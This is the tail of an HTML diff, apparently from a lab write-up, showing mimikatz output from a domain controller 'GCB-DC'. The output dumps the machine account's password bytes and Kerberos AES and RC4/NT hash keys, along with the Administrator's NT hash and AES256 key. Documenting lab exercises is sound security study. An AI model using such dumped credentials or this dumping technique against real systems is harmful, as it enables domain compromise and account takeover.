+         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
+         * Key List :
+           aes256_hmac       932a78766f0dbde584240cd7cdc0f95cbad2949da33596fefdbe2330b6f38244
+           aes128_hmac       40ccd1e8dd9cca45020a0046d5cf39f4
+           rc4_hmac_nt       62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_old      62117bcbfd74006c9c5070162d7d177e
+           rc4_md4           62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_nt_exp   62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_old_exp  62117bcbfd74006c9c5070162d7d177e
+
+Authentication Id : 0 ; 31251 (00000000:00007a13)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:20 AM
+SID               : S-1-5-96-0-0
+
+         * Username : GCB-DC$
+         * Domain   : gcb.local
+         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
+         * Key List :
+           aes256_hmac       932a78766f0dbde584240cd7cdc0f95cbad2949da33596fefdbe2330b6f38244
+           aes128_hmac       40ccd1e8dd9cca45020a0046d5cf39f4
+           rc4_hmac_nt       62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_old      62117bcbfd74006c9c5070162d7d177e
+           rc4_md4           62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_nt_exp   62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_old_exp  62117bcbfd74006c9c5070162d7d177e
+
+Authentication Id : 0 ; 701409 (00000000:000ab3e1)
+Session           : RemoteInteractive from 2
+User Name         : Administrator
+Domain            : GCB
+Logon Server      : GCB-DC
+Logon Time        : 2/15/2024 4:02:07 AM
+SID               : S-1-5-21-2781415573-3701854478-2406986946-500
+
+         * Username : Administrator
+         * Domain   : GCB.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       f6274b069182356199da391d6ea6a5db5b36398adbd0c93636833bab6fd58f30
+           rc4_hmac_nt       f1498c1d1a036c796d0093b2eeae02e2
+           rc4_hmac_old      f1498c1d1a036c796d0093b2eeae02e2
+           rc4_md4           f1498c1d1a036c796d0093b2eeae02e2
+           rc4_hmac_nt_exp   f1498c1d1a036c796d0093b2eeae02e2
+           rc4_hmac_old_exp  f1498c1d1a036c796d0093b2eeae02e2
+
+Authentication Id : 0 ; 31432 (00000000:00007ac8)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:20 AM
+SID               : S-1-5-96-0-0
+
+         * Username : GCB-DC$
+         * Domain   : gcb.local
+         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
+         * Key List :
+           aes256_hmac       932a78766f0dbde584240cd7cdc0f95cbad2949da33596fefdbe2330b6f38244
+           aes128_hmac       40ccd1e8dd9cca45020a0046d5cf39f4
+           rc4_hmac_nt       62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_old      62117bcbfd74006c9c5070162d7d177e
+           rc4_md4           62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_nt_exp   62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_old_exp  62117bcbfd74006c9c5070162d7d177e
+
+Authentication Id : 0 ; 31316 (00000000:00007a54)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:20 AM
+SID               : S-1-5-96-0-1
+
+         * Username : GCB-DC$
+         * Domain   : gcb.local
+         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
+         * Key List :
+           aes256_hmac       932a78766f0dbde584240cd7cdc0f95cbad2949da33596fefdbe2330b6f38244
+           aes128_hmac       40ccd1e8dd9cca45020a0046d5cf39f4
+           rc4_hmac_nt       62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_old      62117bcbfd74006c9c5070162d7d177e
+           rc4_md4           62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_nt_exp   62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_old_exp  62117bcbfd74006c9c5070162d7d177e
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : GCB-DC$
+Domain            : GCB
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:15 AM
+SID               : S-1-5-18
+
+         * Username : gcb-dc$
+         * Domain   : GCB.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       8a6a99f3068eb03ec368737826a634a14dedfe39617cfddc1fe71aed671cca11
+           rc4_hmac_nt       62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_old      62117bcbfd74006c9c5070162d7d177e
+           rc4_md4           62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_nt_exp   62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_old_exp  62117bcbfd74006c9c5070162d7d177e
+
+Authentication Id : 0 ; 658047 (00000000:000a0a7f)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 4:01:53 AM
+SID               : S-1-5-96-0-2
+
+         * Username : GCB-DC$
+         * Domain   : gcb.local
+         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
+         * Key List :
+           aes256_hmac       932a78766f0dbde584240cd7cdc0f95cbad2949da33596fefdbe2330b6f38244
+           aes128_hmac       40ccd1e8dd9cca45020a0046d5cf39f4
+           rc4_hmac_nt       62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_old      62117bcbfd74006c9c5070162d7d177e
+           rc4_md4           62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_nt_exp   62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_old_exp  62117bcbfd74006c9c5070162d7d177e
+
+Authentication Id : 0 ; 49387 (00000000:0000c0eb)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:21 AM
+SID               : S-1-5-90-0-1
+
+         * Username : GCB-DC$
+         * Domain   : gcb.local
+         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
+         * Key List :
+           aes256_hmac       932a78766f0dbde584240cd7cdc0f95cbad2949da33596fefdbe2330b6f38244
+           aes128_hmac       40ccd1e8dd9cca45020a0046d5cf39f4
+           rc4_hmac_nt       62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_old      62117bcbfd74006c9c5070162d7d177e
+           rc4_md4           62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_nt_exp   62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_old_exp  62117bcbfd74006c9c5070162d7d177e
+
+Authentication Id : 0 ; 49335 (00000000:0000c0b7)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:21 AM
+SID               : S-1-5-90-0-1
+
+         * Username : GCB-DC$
+         * Domain   : gcb.local
+         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
+         * Key List :
+           aes256_hmac       932a78766f0dbde584240cd7cdc0f95cbad2949da33596fefdbe2330b6f38244
+           aes128_hmac       40ccd1e8dd9cca45020a0046d5cf39f4
+           rc4_hmac_nt       62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_old      62117bcbfd74006c9c5070162d7d177e
+           rc4_md4           62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_nt_exp   62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_old_exp  62117bcbfd74006c9c5070162d7d177e
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : GCB-DC$
+Domain            : GCB
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:20 AM
+SID               : S-1-5-20
+
+         * Username : gcb-dc$
+         * Domain   : GCB.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       8a6a99f3068eb03ec368737826a634a14dedfe39617cfddc1fe71aed671cca11
+           rc4_hmac_nt       62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_old      62117bcbfd74006c9c5070162d7d177e
+           rc4_md4           62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_nt_exp   62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_old_exp  62117bcbfd74006c9c5070162d7d177e
+
+Authentication Id : 0 ; 31433 (00000000:00007ac9)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:20 AM
+SID               : S-1-5-96-0-1
+
+         * Username : GCB-DC$
+         * Domain   : gcb.local
+         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
+         * Key List :
+           aes256_hmac       932a78766f0dbde584240cd7cdc0f95cbad2949da33596fefdbe2330b6f38244
+           aes128_hmac       40ccd1e8dd9cca45020a0046d5cf39f4
+           rc4_hmac_nt       62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_old      62117bcbfd74006c9c5070162d7d177e
+           rc4_md4           62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_nt_exp   62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_old_exp  62117bcbfd74006c9c5070162d7d177e
+
+Authentication Id : 0 ; 660773 (00000000:000a1525)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2/15/2024 4:01:53 AM
+SID               : S-1-5-90-0-2
+
+         * Username : GCB-DC$
+         * Domain   : gcb.local
+         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
+         * Key List :
+           aes256_hmac       932a78766f0dbde584240cd7cdc0f95cbad2949da33596fefdbe2330b6f38244
+           aes128_hmac       40ccd1e8dd9cca45020a0046d5cf39f4
+           rc4_hmac_nt       62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_old      62117bcbfd74006c9c5070162d7d177e
+           rc4_md4           62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_nt_exp   62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_old_exp  62117bcbfd74006c9c5070162d7d177e
+
+Authentication Id : 0 ; 658096 (00000000:000a0ab0)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 4:01:53 AM
+SID               : S-1-5-96-0-2
+
+         * Username : GCB-DC$
+         * Domain   : gcb.local
+         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
+         * Key List :
+           aes256_hmac       932a78766f0dbde584240cd7cdc0f95cbad2949da33596fefdbe2330b6f38244
+           aes128_hmac       40ccd1e8dd9cca45020a0046d5cf39f4
+           rc4_hmac_nt       62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_old      62117bcbfd74006c9c5070162d7d177e
+           rc4_md4           62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_nt_exp   62117bcbfd74006c9c5070162d7d177e
+           rc4_hmac_old_exp  62117bcbfd74006c9c5070162d7d177e
+
+mimikatz(commandline) # exit</code></pre></div></details></li></ul></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">
+</p></div></details></li></body></html>
         </section>
-      </article>
-    </div>
-  </main>
-
-  <script src="../../assets/js/script.js"></script>
-  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
-  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
-</body>
-</html>
